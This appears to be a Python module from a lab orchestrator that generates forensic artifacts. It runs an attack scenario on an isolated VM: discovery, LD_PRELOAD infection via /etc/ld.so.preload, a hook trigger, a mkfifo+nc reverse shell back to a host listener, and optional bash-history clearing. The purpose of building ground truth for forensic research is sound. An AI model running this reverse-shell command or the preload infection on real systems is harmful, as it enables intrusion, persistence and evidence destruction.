"""
orchestrator/attacks/scenario_01_ldpreload.py

Scenario 01 -- LD_PRELOAD infection via /etc/ld.so.preload

Attack narrative
----------------
The attacker gains initial SSH access as an unprivileged user. They perform
system discovery, compile a malicious shared library that hooks getuid(3),
write it to /etc/ld.so.preload, then trigger the hook by spawning a new
process. A reverse shell is established from inside that hooked process,
leaving the .so mapped in memory. Cleanup optionally clears bash history.

Steps
-----
1. T1082  discovery -- system info collection (best-effort)
2. T1574.006  LD_PRELOAD infection -- compile .so + write /etc/ld.so.preload
3. custom  ldpreload_trigger -- spawn a new process, verify hook is active
4. custom  reverse_shell -- mkfifo+nc shell back to host listener
5. T1070.003  cleanup -- clear bash history (only if run_cleanup=True)

Ground-truth shape
------------------
run() returns {"steps": [...]} (orchestrator stamps "scenario_id" on top).
Step entries are heterogeneous by design:
- ART steps (1, 2, 5):  {step, guid, name, exit_code, stdout, stderr}
- ldpreload_trigger:    {step, exit_code, id_output, hook_active}
- reverse_shell:        {step, exit_code, connected, id_output, error}
- cleanup (skipped):    {step, run: False}

Forensic artifacts generated
-----------------------------
Disk:
  /etc/ld.so.preload          -- written by T1574.006; removed by its cleanup
  /tmp/T1574006.so            -- compiled malicious shared library
  /tmp/atomics/T1574.006/     -- source tree uploaded by ArtRunner
  ~/.bash_history             -- if cleanup NOT run: contains all commands above
                              -- if cleanup IS run: file absent or truncated

Memory:
  gcc process (during prereq compile)
  sh writing /etc/ld.so.preload (T1574.006 executor)
  any process spawned after step 2 has /tmp/T1574006.so in its maps
  nc + sh reverse shell process and its open socket (step 4)
"""

from __future__ import annotations

import logging
import socket
import threading
import time
from typing import Any

from orchestrator.attacks.art_runner import ArtRunner
from orchestrator.core import console
from orchestrator.core.ssh_client import SSHClient

_log = logging.getLogger(__name__)

# --- ART test identifiers ------------------------------------------------

_DISCOVERY_T = "T1082"
_DISCOVERY_G = "cccb070c-df86-4216-a5bc-9fb60c74e27c"  # List OS Information

_LDPRELOAD_T = "T1574.006"
_LDPRELOAD_G = "39cb0e67-dd0d-4b74-a74b-c072db7ae991"  # /etc/ld.so.preload

_CLEANUP_T = "T1070.003"
_CLEANUP_G = "a934276e-2be5-4a36-93fd-98adbb5bd4fc"  # rm ~/.bash_history

_REVSHELL_PORT = 4444
_REVSHELL_TIMEOUT = 10


# --- public entry point --------------------------------------------------


def run(
    ssh: SSHClient,
    runner: ArtRunner,
    host_ip: str,
    internet_on,
    internet_off,
    *,
    run_cleanup: bool = False,
) -> dict[str, Any]:
    """
    Execute scenario 01 steps in sequence.

    Returns a ground-truth dict. The orchestrator stamps "scenario_id" on top.
    Raises RuntimeError if a mandatory step fails.
    """
    ground_truth: dict[str, Any] = {"steps": []}
    steps = ground_truth["steps"]

    # Step 1 -- discovery (best-effort, a failed discovery does not abort the run)
    _log.info("[1/4] discovery")
    result = runner.run_test(_DISCOVERY_T, _DISCOVERY_G, raise_on_error=False)
    steps.append({"step": "discovery", **result})

    # Step 2 -- LD_PRELOAD infection
    # Prereq compiles the .so on the victim (offline-safe: no network call in the
    # ART source). We bracket with internet_on/off anyway so the convention holds
    # for future scenarios whose prereqs do fetch assets over the network.
    _log.info("[2/4] LD_PRELOAD infection")
    internet_on()
    try:
        runner.run_prerequisites(_LDPRELOAD_T, _LDPRELOAD_G, timeout=60)
    finally:
        internet_off()
    result = runner.run_test(_LDPRELOAD_T, _LDPRELOAD_G)
    steps.append({"step": "ldpreload", **result})

    # Step 3 -- trigger the hook
    # Spawn a new shell process so the dynamic linker loads /etc/ld.so.preload.
    # The .so hooks getuid(3) to return 0; we capture `id` output as evidence.
    # Even if the hook does not work (e.g. libc version mismatch), the process
    # still has /tmp/T1574006.so mapped in memory -- a recoverable artifact.
    _log.info("[3/4] LD_PRELOAD hook trigger")
    result = _trigger_hook(ssh)
    steps.append({"step": "ldpreload_trigger", **result})

    # Step 4 -- reverse shell
    # The shell spawned here inherits the hooked environment; its process maps
    # will show /tmp/T1574006.so loaded.
    _log.info("[4/4] reverse shell")
    result = _run_reverse_shell(ssh, host_ip)
    steps.append({"step": "reverse_shell", **result})

    # Cleanup (optional -- leave False to preserve all artifacts for forensics)
    if run_cleanup:
        _log.info("cleanup: history clear + LD_PRELOAD removal")
        runner.run_test(_CLEANUP_T, _CLEANUP_G, raise_on_error=False)
        runner.run_cleanup(_LDPRELOAD_T, _LDPRELOAD_G)
        steps.append({"step": "cleanup", "run": True})
    else:
        _log.info("cleanup: skipped (artifacts preserved)")
        steps.append({"step": "cleanup", "run": False})

    return ground_truth


# --- custom step helpers -------------------------------------------------


def _trigger_hook(ssh: SSHClient) -> dict[str, Any]:
    """
    Spawn a new process that loads /etc/ld.so.preload and run `id`.

    The ART T1574.006 executor writes the preload entry but does not start any
    new process afterwards, so the hook is technically active but never exercised.
    This step closes that gap: it spawns a fresh sh session so the dynamic linker
    picks up the .so, then runs `id` to capture whether getuid() was hooked.

    hook_active is True when id output contains "uid=0" (root), indicating the
    getuid hook returned 0. False means the library loaded but the hook had no
    observable effect (libc mismatch, non-fatal for forensic purposes).
    """
    code, out, err = ssh.run("sh -c 'id'", timeout=10)
    hook_active = "uid=0" in out
    if hook_active:
        console.ok(f"LD_PRELOAD hook active: {out.strip()}")
    else:
        console.warn(f"LD_PRELOAD hook not observed in id output: {out.strip()!r}")
    return {
        "exit_code": code,
        "id_output": out.strip(),
        "hook_active": hook_active,
    }


def _run_reverse_shell(ssh: SSHClient, host_ip: str) -> dict[str, Any]:
    """
    Bind a TCP listener on the host, trigger a mkfifo+nc reverse shell on the
    VM, send one command to confirm the connection, then close it.

    We only need to confirm that the shell connected and leave a process + open
    socket in memory for forensics. The shell is killed immediately after.

    host_ip: the isolated-network gateway address as seen from the VM
             (config.ISOLATED_NETWORK_GATEWAY).
    """
    received: list[str] = []
    error: list[str] = []

    def _listen() -> None:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", _REVSHELL_PORT))
                srv.listen(1)
                srv.settimeout(_REVSHELL_TIMEOUT)
                conn, addr = srv.accept()
                console.ok(f"reverse shell connected from {addr}")
                conn.sendall(b"id\n")
                time.sleep(0.5)
                data = conn.recv(4096)
                received.append(data.decode(errors="replace").strip())
                conn.sendall(b"exit\n")
                conn.close()
        except Exception as exc:
            error.append(str(exc))

    # Listener must be bound before the VM-side nc is triggered; otherwise the
    # VM connects to a closed port and the shell dies before we read anything.
    listener = threading.Thread(target=_listen, daemon=True)
    listener.start()
    time.sleep(0.3)

    fifo = "/tmp/.rs_fifo"
    cmd = (
        f"rm -f {fifo}; mkfifo {fifo}; "
        f"cat {fifo} | /bin/sh -i 2>&1 | nc {host_ip} {_REVSHELL_PORT} > {fifo} &"
    )
    code, out, err = ssh.run(cmd, timeout=15)

    listener.join(timeout=_REVSHELL_TIMEOUT + 2)

    if error:
        console.warn(f"reverse shell listener error: {error[0]}")
    elif not received:
        console.warn("reverse shell: no data received (connection may have failed)")
    else:
        console.ok(f"reverse shell id output: {received[0]}")

    return {
        "exit_code": code,
        "connected": bool(received),
        "id_output": received[0] if received else "",
        "error": error[0] if error else "",
    }
